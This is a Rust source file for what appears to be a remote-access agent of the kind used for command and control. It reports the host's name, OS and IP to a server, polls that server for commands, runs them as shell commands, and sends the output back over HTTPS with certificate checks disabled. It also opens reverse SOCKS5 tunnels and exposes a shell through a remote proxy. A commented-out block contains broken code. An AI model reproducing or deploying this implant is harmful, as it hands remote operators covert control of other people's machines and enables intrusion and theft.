use std::io::{self, ErrorKind, Read};
use std::process::Command;
use std::fs;
use std::path::Path;
use serde_json::json;
use hostname;
use os_info;
use std::net::UdpSocket;
use crate::networking::socks5::Socks5Client;
use std::time::Duration;
use crate::networking::socks5::socks5_bind;


#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}

// Create a reusable ureq agent that skips TLS verification
fn create_agent() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .tls_connector(std::sync::Arc::new(
            native_tls::TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap()
        ))
        .build()
}

async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
    let output = Command::new(cmd)
        .args(args)
        .output()?;

    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)))
}

// Add tree-related functions for fun
fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
    let display = path.file_name()
        .unwrap_or_else(|| path.as_os_str())
        .to_string_lossy();
    
    println!("{}{}{}", prefix, 
        if is_last { "└── " } else { "├── " }, 
        display);

    if path.is_dir() {
        let entries = fs::read_dir(path)?
            .collect::<Result<Vec<_>, io::Error>>()?;
        
        for (i, entry) in entries.iter().enumerate() {
            let new_prefix = format!("{}{}", 
                prefix,
                if is_last { "    " } else { "│   " }
            );
            display_tree(&entry.path(), &new_prefix, i == entries.len() - 1)?;
        }
    }
    Ok(())
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle special commands
    match cmd_parts[0] {
        "socks5_tunnel" => {
            if cmd_parts.len() != 4 {
                return Err(io::Error::new(ErrorKind::InvalidInput, 
                    "Usage: socks5_tunnel <proxy_host> <proxy_port> <local_port>"));
            }
            
            let proxy_host = cmd_parts[1].to_string();
            let proxy_port = cmd_parts[2].parse::<u16>()
                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid proxy port: {}", e)))?;
            let local_port = cmd_parts[3].parse::<u16>()
                .map_err(|e| io::Error::new(ErrorKind::InvalidInput, format!("Invalid local port: {}", e)))?;

            // Create SOCKS5 client
            let client = Socks5Client::new(proxy_host.clone(), proxy_port)
                .with_timeout(Duration::from_secs(30));

            // Start tunnel in background task
            tokio::spawn(async move {
                println!("[SOCKS5] Starting reverse tunnel to {}:{} on local port {}", 
                    proxy_host, proxy_port, local_port);
                
                if let Err(e) = client.start_reverse_tunnel(local_port).await {
                    println!("[ERROR] Reverse tunnel failed: {}", e);
                }
            });

            return Ok(format!("Started SOCKS5 reverse tunnel on local port {}", local_port));
        },
        _ => {
            // Handle regular shell commands
            let output = if cfg!(windows) {
                // Join all parts for Windows cmd.exe
                let full_command = cmd_parts.join(" ");
                create_command(&full_command, &[]).output()?
            } else {
                // Use first part as command and rest as args for Unix
                create_command(cmd_parts[0], &cmd_parts[1..]).output()?
            };

            Ok(format!("{}{}", 
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)))
        }
    }
}

fn stdin_ready() -> io::Result<bool> {
    let mut stdin = io::stdin();
    let mut buf = [0u8; 1];
    Ok(stdin.read(&mut buf)? > 0)
}

fn get_local_ip() -> io::Result<String> {
    // Create a UDP socket and "connect" it to a public IP
    // This doesn't send any packets, it just helps us determine which local interface would be used
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.connect("8.8.8.8:80")?;
    let addr = socket.local_addr()?;
    Ok(addr.ip().to_string())
}

async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
    println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip = get_local_ip().unwrap_or_else(|_| "Unknown".to_string());

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "commands": Vec::<String>::new()
    });

    let agent = create_agent();
    match agent.post(&url)
        .set("Content-Type", "application/json")
        .send_json(data)
    {
        Ok(response) => {
            println!("[DEBUG] Heartbeat response: {:?}", response.status());
            Ok(())
        },
        Err(e) => {
            println!("[ERROR] Failed to send heartbeat: {}", e);
            Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
        }
    }
}

async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
    let agent = create_agent();
    
    match agent.get(&url).call() {
        Ok(response) => {
            if response.status() == 204 {
                return Ok(None);
            }
            
            let command: String = response.into_json()?;
            Ok(Some(command))
        },
        Err(e) => {
            println!("[DEBUG] No command available: {}", e);
            Ok(None)
        }
    }
}

async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
    let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
    
    let data = json!({
        "command": command,
        "output": output,
        "timestamp": chrono::Utc::now().to_rfc3339()
    });

    let agent = create_agent();
    match agent.post(&url)
        .set("Content-Type", "application/json")
        .send_json(data)
    {
        Ok(_) => Ok(()),
        Err(e) => Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
    }
}

async fn expose_shell(port: u16, proxy_addr: &str, proxy_port: u16) -> io::Result<()> {
    /*
    // 1) request a BIND on the remote proxy
    let mut inbound = socks5_bind(proxy_addr, proxy_port, port).await?;
    println!("[SOCKS5] BIND established on {}:{}", proxy_addr, proxy_port);

    // 2) tokio_socks will do the two‑reply for you; once it returns
    //    you get a future that resolves when *your* listener gets an incoming
    //    connect from the server operator.
    let (mut inbound, _) = bind_stream.into_inner();
    // 3) now inbound is your 2‑way channel from the server → agent shell
    tokio::io::copy_bidirectional(&mut inbound, &mut inbound).await?;
    Ok(())
    */

    let mut stream = socks5_bind(proxy_addr, proxy_port, port).await?;
    println!("[SOCKS5] Reverse tunnel established via {}:{}", proxy_addr, proxy_port);

    
    // splitting tunnel into read/write halves
    let (mut reader, mut writer) = tokio::io::split(stream);
    let mut stdin = tokio::io::stdin();
    let mut stdout = tokio::io::stdout();

    // pump local stdin -> remote, and remote -> local stdout
    let to_remote = tokio::spawn(async move {
        tokio::io::copy(&mut stdin, &mut writer).await
    });

    let to_local = tokio::spawn(async move {
        tokio::io::copy(&mut reader, &mut stdout).await
    });

    // wait until the either side closes
    tokio::select! {
        _ = to_remote => {
            println!("[SOCKS5] Local stdin closed");
        }
        _ = to_local => {
            println!("[SOCKS5] Remote stream closed");
        }
    }

    Ok(())
}

// This is a simple command shell that allows for basic file operations and command execution.
// It can change directories, upload and download files, and display a directory tree.
// PRECONDITION: The server must be running and accessible at the specified address.
// POSTCONDITION: The shell will exit when the user types 'exit'.
pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
    println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
    send_heartbeat(server_addr, agent_id).await?;
    
    loop {
        // Poll for commands
        println!("[DEBUG] Polling for commands...");
        match get_command(server_addr, agent_id).await? {
            Some(command) => {
                println!("[DEBUG] Received command: {}", command);
                
                // Handle command differently based on platform
                #[cfg(windows)]
                let cmd_parts: Vec<&str> = vec![&command];
                
                #[cfg(not(windows))]
                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                
                let output = execute_command(&cmd_parts).await?;
                submit_result(server_addr, agent_id, &command, &output).await?;
            }
            None => {
                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
            }
        }
    }
}
